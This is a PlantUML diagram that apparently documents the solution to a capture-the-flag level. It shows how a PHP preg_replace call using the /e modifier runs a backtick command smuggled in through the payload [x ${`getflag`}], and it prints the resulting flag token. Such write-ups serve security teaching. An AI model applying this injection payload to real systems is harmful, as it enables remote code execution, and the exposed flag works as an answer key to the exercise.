@startuml level06_exploit
title Level06 - PHP /e Modifier with Backtick Execution

actor Attacker
participant "Exploit File" as ExploitFile
participant "level06 Binary" as Binary
participant "PHP preg_replace" as PHP
participant "flag06" as Flag06

Attacker -> ExploitFile: Create file with payload: [x ${`getflag`}]
ExploitFile --> Attacker: Payload ready

Attacker -> Binary: ./level06 /path/to/exploit_file

Binary -> Binary: Read file content
Binary -> PHP: preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", content)
note right of PHP
  Captures: ${`getflag`}
  Evaluates backticks in /e context
end note

PHP -> PHP: Process: y("${`getflag`}")
PHP -> Flag06: Execute getflag command
Flag06 --> PHP: wiok45aaoguiboiki2tuin6ub

PHP -> PHP: Apply y() function (dot replacement)
PHP --> Binary: Return processed result
Binary --> Attacker: wiok45aaoguiboiki2tuin6ub

@enduml
